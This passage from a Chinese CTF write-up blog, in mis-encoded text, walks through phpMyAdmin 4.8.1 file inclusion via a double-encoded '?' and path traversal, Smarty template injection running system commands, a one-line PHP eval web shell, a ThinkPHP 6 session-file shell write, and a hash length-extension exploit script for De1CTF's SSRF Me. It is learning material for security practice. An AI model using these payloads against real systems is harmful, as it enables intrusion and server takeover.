<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="åè®°">åè®°</h3>
<p>çŸ¥å…¶ç„¶æ›´è¦çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ¥å¤ç°ä¸€ä¸‹phpmyadmin 4.8.1ã€‚</p>
<p>é—®é¢˜å°±å‡ºåœ¨ç¬¬61è¡Œçš„includeå‡½æ•°</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702164431.png" alt=""></p>
<p>å‰ææ˜¯ç»•è¿‡55-59è¡Œçš„æ£€æŸ¥ã€‚</p>
<p>ç¬¬55è¡Œå’Œç¬¬56è¡Œéƒ½æ¯”è¾ƒå®¹æ˜“passï¼Œç¬¬57è¡Œé™åˆ¶targetå‚æ•°ä¸èƒ½ä»¥indexå¼€å¤´ï¼Œç¬¬58è¡Œé™åˆ¶targetå‚æ•°ä¸èƒ½æœ‰<code>$target_blacklist</code>æ•°ç»„ä¸­çš„å…³é”®å­—ï¼Œå…¶ä¸­<code>$target_blacklist</code>åŒ…æ‹¬<code>import.php</code>å’Œ<code>export.php</code>ï¼Œç¬¬59è¡Œå°†targetå‚æ•°ä¼ å…¥<code>checkPageValidity</code>è¿›è¡Œæ£€æŸ¥ï¼Œæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">            $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¦æƒ³ä½¿è¯¥å‡½æ•°è¿”å›trueï¼ŒåŒ…å«çš„æ–‡ä»¶å¿…é¡»åŒ…å«åœ¨ç™½åå•<code>$goto_whitelist</code>ä¸­ï¼Œ</p>
<p>ç¬¬14è¡Œåˆ°21è¡Œçš„ä»£ç æ˜¯ä»¥<code>?</code>åˆ†å‰²ç„¶åå–å‡ºå‰é¢çš„å­—ç¬¦ä¸²å†åˆ¤æ–­å€¼æ˜¯å¦å­˜åœ¨ä¸<code>$goto_whilelist</code>æŸä¸ªæ•°ç»„ä¸­ã€‚</p>
<p>ç¬¬23è¡Œåˆ°ç¬¬31è¡Œä»£ç æ˜¯å°†<code>$page</code>å‚æ•°ç”¨urlencodeè§£ç å†è¿›è¡Œä»¥<code>?</code>åˆ†å‰²å–å‡ºå‰é¢çš„å€¼åšåˆ¤æ–­ã€‚</p>
<p>æˆ‘æŠŠ<code>?</code>ä¸¤æ¬¡urlç¼–ç ä¸º<code> %253f</code> å³å¯ç»•è¿‡éªŒè¯ã€‚</p>
<p>é‚£ä¹ˆä¼ å…¥<code>target=db_sql.php%253f/../../etc/passwd</code>ï¼Œå…¶ä¸­<code>%253f</code>æ˜¯?å·çš„äºŒæ­¤urlç¼–ç urlcodeå°†<code>$page</code>è§£ç åæ˜¯<code>db_sql.php?/../../etc/passwd</code>  ï¼Œå†ä»¥<code>?</code>åˆ†å‰²å–å‡ºæ¥å‰é¢çš„å­—ç¬¦ä¸²ä¸º<code>db_sql.php</code>ï¼Œâ€‹<code>$goto_whitelist</code>ä¸­æœ‰<code>db_sql.php</code>æ‰€ä»¥ä¼šè¿›å…¥æœ€åä¸€ä¸ªifè¯­å¥å¹¶è¿”å›trueã€‚</p>
<p>åˆ©ç”¨æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸‹<code>SELECT '&lt;?=phpinfo()?&gt;';</code>ï¼Œç„¶åæŸ¥çœ‹è‡ªå·±çš„sessionidï¼ˆcookieä¸­phpMyAdminçš„å€¼ï¼‰ï¼Œç„¶ååŒ…å«sessionæ–‡ä»¶å³å¯ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702171557.png" alt=""></p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11">CISCN2019 åä¸œå—èµ›åŒº Web11</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>smarty SSTI</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<p><a href="https://www.jianshu.com/p/eb8d0137a7d3">å‚è€ƒæ–‡ç« </a></p>
<p>é¡µé¢æç¤ºä¸¤ä¸ªAPIå¹¶ä¸èƒ½ç”¨ï¼Œä½†æ˜¯åœ¨å³ä¸Šè§’è¿˜æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªCurrent IPçš„æ˜¾ç¤ºï¼Œè€Œä¸”é¡µè„šè¿˜è¯´æ˜äº†è¿™ä¸ªç«™ç‚¹ç”¨åˆ°äº†Smartyæ¨¡æ¿å¼•æ“ï¼Œé‚£ä¹ˆSSTIçš„æ³¨å…¥ç‚¹åº”è¯¥å°±æ˜¯åœ¨<code>X-Forward-For</code>è¯·æ±‚å¤´ã€‚</p>
<p>ç”¨<code>&#123;&#123;7*'7'&#125;&#125;</code>æµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150025.png" alt=""></p>
<p>ç”¨ç½‘ä¸Šå¸¸è§çš„Smarty SSTIè¯»æ–‡ä»¶çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150146.png" alt=""></p>
<p>ç›´æ¥æŠ¥é”™ã€‚</p>
<blockquote>
<p><strong><a href="http://d.hatena.ne.jp/keyword/Smarty">Smarty</a>çš„{if}æ¡ä»¶åˆ¤æ–­å’Œ<a href="http://d.hatena.ne.jp/keyword/PHP">PHP</a>çš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚å…¨éƒ¨çš„<a href="http://d.hatena.ne.jp/keyword/PHP">PHP</a>æ¡ä»¶è¡¨è¾¾å¼å’Œ<a href="http://d.hatena.ne.jp/keyword/%C8%A1%BF%F4">å‡½æ•°</a>éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨</strong>ï¼Œå¦‚*||*,or,&amp;&amp;,and,is_array(), ç­‰ç­‰ã€‚</p>
</blockquote>
<p>æŒ‰ç…§ifçš„è¿™ä¸ªç‰¹æ€§ï¼Œå°è¯•æ‰§è¡Œphpinfo()ï¼ŒæˆåŠŸæ‰§è¡Œã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150301.png" alt=""></p>
<p>ä½¿ç”¨systemå‡½æ•°å¯ä»¥æ‰§è¡Œ<code>ls</code>å‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œè¯»æ–‡ä»¶çš„æ“ä½œã€‚é‚£å°±ç›´æ¥ç”¨<code>show_source</code>å‡½æ•°</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712150445.png" alt=""></p>
<h3 id="æ‹“å±•">æ‹“å±•</h3>
<p>ä¸åŒç‰ˆæœ¬å¯ä»¥åˆ©ç”¨çš„æ–¹å¼ä¸åŒï¼Œå¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š</p>
<p>1.æ—§ç‰ˆSmartyæ”¯æŒä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ã€‚</p>
<p>Smarty3çš„å®˜æ–¹æ‰‹å†Œæè¿°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Smartyå·²ç»åºŸå¼ƒ&#123;php&#125;æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ&#123;php&#125;ä»…åœ¨SmartyBCä¸­å¯ç”¨</span><br></pre></td></tr></table></figure>
<p>2.æ—§ç‰ˆSmartyå¯ä»¥é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™</p>
<p>3.PHPå‡½æ•°éƒ½å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼Œå› æ­¤æ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure>
<p>ä¾¿å¯éšæ„æ‰§è¡Œå‘½ä»¤ï¼›æ‰§è¡Œå¤šæ¡è¯­å¥çš„è¯å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å½¢å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;system(&#39;ls&#39;)&#125;&#123;system(&#39;cat index.php&#39;)&#125;</span><br></pre></td></tr></table></figure>
<p>-----------------åˆ†å‰²çº¿</p>
<p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5436&amp;page=3">æ”»é˜²ä¸–ç•Œ</a>ä¸Šæœ‰ä¸€é“å‡çº§ç‰ˆçš„ï¼Œé™åˆ¶disable_functionä»¥åŠopen_basedirã€‚</p>
<p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç›´æ¥å†™shellï¼Œç”¨èšå‰‘è¿æ¥ç›´æ¥ç»•è¿‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;)&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GYCTF2020-Easy-Thinking">GYCTF2020 Easy Thinking</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>ThinkPHP 6.0.0~6.0.2 ä»»æ„æ–‡ä»¶ä¸Šä¼ </li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>éšä¾¿æµ‹è¯•å‘ç°ç”¨çš„æ¡†æ¶æ˜¯ThinkPHP6.0ï¼ŒGoogleä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°1æœˆä»½çˆ†å‡ºçš„ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ã€‚</p>
<blockquote>
<p><a href="https://paper.seebug.org/1114">https://paper.seebug.org/1114</a></p>
</blockquote>
<p>æ‰«æä¹‹åæœ‰æºç æ³„éœ²<code>www.zip</code>ï¼Œä¸‹è½½ä¹‹åå®¡è®¡ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (Request::isPost())&#123;</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&#x27;?UID&#x27;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> redirect(<span class="string">&#x27;/home/member/login&#x27;</span>);            </span><br><span class="line">           &#125;</span><br><span class="line">           $data = input(<span class="string">&quot;post.&quot;</span>);</span><br><span class="line">           $record = session(<span class="string">&quot;Record&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (!session(<span class="string">&quot;Record&quot;</span>))</span><br><span class="line">           &#123;</span><br><span class="line">               session(<span class="string">&quot;Record&quot;</span>,$data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">               $recordArr = explode(<span class="string">&quot;,&quot;</span>,$record);</span><br><span class="line">               $recordLen = sizeof($recordArr);</span><br><span class="line">               <span class="keyword">if</span> ($recordLen &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">                   array_shift($recordArr);</span><br><span class="line">                   session(<span class="string">&quot;Record&quot;</span>,implode(<span class="string">&quot;,&quot;</span>,$recordArr) . <span class="string">&quot;,&quot;</span> . $data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">                   <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           session(<span class="string">&quot;Record&quot;</span>,$record . <span class="string">&quot;,&quot;</span> . $data[<span class="string">&quot;key&quot;</span>]);</span><br><span class="line">           <span class="keyword">return</span> View::fetch(<span class="string">&quot;result&quot;</span>,[<span class="string">&quot;res&quot;</span> =&gt; <span class="string">&quot;There&#x27;s nothing here&quot;</span>]);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> View(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç° searchæœç´¢çš„åœ°æ–¹æœ‰ä¸€ä¸ª session çš„å‚¨å­˜ã€‚</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•ï¼Œç„¶åæœç´¢çš„æ—¶å€™æŠ“åŒ…ã€‚</p>
<p>thinkphp6 ä¼šé»˜è®¤åœ¨ /runtime/session åˆ›å»ºä¸€ä¸ªsess_xxxæ ¼å¼çš„sessionæ–‡ä»¶ï¼Œè¿™é‡Œçš„xxxå°±æ˜¯PHPSESSIDï¼ˆå¿…é¡»æ˜¯32ä½ï¼‰ï¼Œè€Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯keyçš„å†…å®¹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200723202726.png" alt=""></p>
<p>ç„¶åæœç´¢çš„æ—¶å€™å†™å…¥shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200723202921.png" alt=""></p>
<p>å†ç”¨èšå‰‘è¿æ¥ï¼Œç”¨æ’ä»¶ç»•è¿‡disable_functionã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>æ¡†æ¶æ¼æ´</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”XSS</title>
    <url>/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/</url>
    <content><![CDATA[<h2 id="CISCN2019-åä¸œåŒ—èµ›åŒº-Web2">[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h2>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web9">[CISCN2019 åä¸œå—èµ›åŒº]Web9</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”SSRF</title>
    <url>/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/</url>
    <content><![CDATA[<h2 id="De1CTF2019-SSRF-Me">De1CTF2019 SSRF Me</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>Pythonä»£ç å®¡è®¡</li>
<li>MD5æ‰©å±•æ”»å‡»</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>é¦–å…ˆçœ‹ä¸‰ä¸ªè·¯ç”±ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<ol>
<li>/ï¼šé¦–é¡µï¼Œè·å–æºç ï¼›</li>
<li>/geneSignï¼šä»ç”¨æˆ·è·å–<code>param</code>å‚æ•°ï¼Œå†ç»“åˆé¢„è®¾çš„<code>action='scan'</code>è°ƒç”¨<code>getSign</code>ç”Ÿæˆç­¾åï¼›</li>
<li>/De1taï¼šä»cookieä¸­è·å–<code>action</code>å’Œ<code>sign</code>ï¼Œå†è·å–<code>param</code>å‚æ•°ï¼Œç»“åˆå½“å‰IPåœ°å€æ„é€ ä¸€ä¸ªTaskç±»ï¼Œæœ€åä»¥jsonçš„æ ¼å¼è¿”å›<code>Exec</code>æ–¹æ³•æ‰§è¡Œç»“æœã€‚</li>
</ol>
<p>å†æ¥çœ‹getSignå‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>å°† secert_key å’Œ param å’Œ action æ‹¼åœ¨ä¸€èµ·ï¼Œå¯¹å…¶md5ç­¾åã€‚secert_keyæ˜¯éšæœºç”Ÿæˆçš„16ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²ã€‚</p>
<p>ç„¶åæ¥çœ‹wafå‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>ç¦æ­¢paramå‚æ•°ä»¥<code>gopher</code>å’Œ<code>file</code>å¼€å¤´ã€‚</p>
<p>å†æ¥çœ‹åˆ° Task ç±»çš„ Exec æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> self.checkSign():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆéªŒè¯ç­¾åï¼Œå¦‚æœæ˜¯<code>scan</code>ç±»å‹å°±è°ƒç”¨ scan æ–¹æ³•æ¥è¯»å–å†…å®¹å¹¶å†™åˆ°æ²™ç›’ä¸‹çš„ <code>result.txt</code> æ–‡ä»¶ã€‚å¦‚æœæ˜¯<code>read</code>ç±»å‹å°±è¯»å–æ²™ç›’ä¸­çš„<code>result.txt</code>å†…å®¹ã€‚</p>
<p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼š</p>
<ul>
<li>è¯»å– flag.txt åˆ° result.txtã€‚</li>
<li>å±•ç¤º result.txt çš„å†…å®¹ã€‚</li>
</ul>
<h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h4>
<p>é¢„æœŸè§£æ³•ï¼šå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»+CVE-2019-9948(urllib)</p>
<p>ç®€å•æ¥è¯´MD5æ‰©å±•é•¿åº¦æ”»å‡»çš„åŸç†ï¼š</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/241e772a513f">https://www.jianshu.com/p/241e772a513f</a></p>
</blockquote>
<blockquote>
<p>å½“å·²çŸ¥ä»¥ä¸‹ä¸‰ç‚¹</p>
<ul>
<li>md5(salt+message)çš„å€¼</li>
<li>messageå†…å®¹</li>
<li>salt+messageé•¿åº¦</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼</p>
</blockquote>
<p>urlopenæœ‰ä¸¤ç§åŠæ³•å¯ä»¥è¯»å–åˆ°æœ¬åœ°æ–‡ä»¶ã€‚</p>
<ul>
<li>ç›´æ¥å†™æ–‡ä»¶åï¼Œå‰é¢å•¥éƒ½åˆ«å¸¦ã€‚</li>
<li>local_file: ,å‚è€ƒ <a href="https://bugs.python.org/issue35907">https://bugs.python.org/issue35907</a></li>
</ul>
<p>Pythonè„šæœ¬expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;</span></span><br><span class="line">param = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getSign&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate sign</span></span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, param + <span class="string">&#x27;scan&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;De1ta&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h4>
<p>è¦æƒ³è¿›å…¥å¯¹actionåˆ¤æ–­çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å…ˆéªŒè¯ç­¾åï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<ol>
<li>åœ¨<code>checkSign()</code>å‡½æ•°çš„æ¯”è¾ƒä¸­ï¼Œå·¦è¾¹æ˜¯<code>getSign(self.action, self.param)</code>ï¼Œå³è¾¹æ˜¯<code>getSign('scan', param)</code>ï¼ˆå› ä¸ºåœ¨è®¿é—®geneSigné¡µé¢æ—¶ï¼Œæ˜¯è‡ªåŠ¨ä¼ å…¥<code>scan</code>å‚æ•°ï¼‰ã€‚</li>
<li>å¦‚æœå†å†™æ·±ä¸€ç‚¹ï¼Œå·¦è¾¹æ˜¯<code>md5(key + self.param + self.action)</code>ï¼Œè€ƒè™‘åˆ°è¦è¯»å–<code>flag.txt</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆ<code>md5(key + 'flag.txt' + self.action)</code>ã€‚</li>
